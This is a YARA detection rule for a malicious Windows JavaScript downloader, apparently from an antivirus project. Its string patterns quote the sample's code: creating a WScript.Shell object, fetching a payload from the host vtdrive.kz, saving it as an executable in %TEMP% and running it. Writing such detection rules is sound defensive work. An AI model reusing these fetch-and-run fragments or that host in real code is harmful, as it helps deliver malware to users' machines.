rule sig_20160330_28d4ebecad0de14bd3e4694c5d311cd6 {
  meta:
    description = "datamaliciousorder - file 20160330_28d4ebecad0de14bd3e4694c5d311cd6.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "642975c302dce4c0a58791eedef2c5d7aeb926d16f441e0e6efad60ee426c029"

  strings:
    $s1  = "var Y = function RX() {return WScript[JO](\"WScript\"+\".Shell\");}(), V = 11;" fullword ascii
    $s2  = "function JQ(K0, O){J = J * 1; return K0 - O;};" fullword ascii
    $s3  = "FP[K](\"GET\", \"http://vtdrive.kz/f6dh1a\", false);" fullword ascii
    $s4  = "if (FP[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function E() {return Y[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"zS2TzQEhTFJaqc.ex\" + \"e\";};" fullword ascii
    $s6  = "function VX(){return M + \"\";};" fullword ascii
    $s7  = "function CE() {return ((D == true) && (D == C1)) ? 1 : J;};" fullword ascii
    $s8  = "function YC(N){Y[\"Run\"](N, J, J);};" fullword ascii
    $s9  = "}while (H);" fullword ascii
    $s10 = "function C(){return JO;};" fullword ascii
    $s11 = "var P0 = new this[\"Date\"]();" fullword ascii
    $s12 = "return JQ(QH, E0);" fullword ascii
    $s13 = "function IB()" fullword ascii
    $s14 = "function FG(){return 22;};" fullword ascii
    $s15 = "function JM(Q) {var LB = (1, 2, 3, 4, 5, Q); return LB;};" fullword ascii
    $s16 = "C1 = true; " fullword ascii
    $s17 = "var C1 = false;" fullword ascii
    $s18 = "var GD = false;" fullword ascii
    $s19 = "} catch(UQ){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}